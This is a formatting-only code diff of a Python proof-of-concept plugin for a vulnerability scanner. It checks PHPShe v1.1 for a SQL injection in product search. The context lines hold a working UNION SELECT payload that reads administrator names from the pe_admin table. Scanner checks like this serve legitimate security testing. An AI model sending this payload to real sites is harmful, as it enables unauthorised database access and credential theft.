@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPShe_0002' # 平台漏洞编号，留空
+    vuln_id = 'PHPShe_0002'  # 平台漏洞编号，留空
     name = 'PHPShe v1.1 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2013-04-12'  # 漏洞公布时间
     desc = '''
         PHPShe v1.1 product.php文件 搜索注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPShe'  # 漏洞应用名称
     product_version = 'PHPShe v1.1'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'd637952d-491a-4d8f-87c3-189874bd9b6f'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/product/list?keyword=kn1f3'+union+select+1,2,3,4,5,(select+concat(admin_name,0x27,md5(c),0x27)+from+pe_admin),7,8,9,10,11,12,13,14,15,16,17,18,19 and+'1'='1"
             url = self.target + payload
             r = requests.get(url)
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
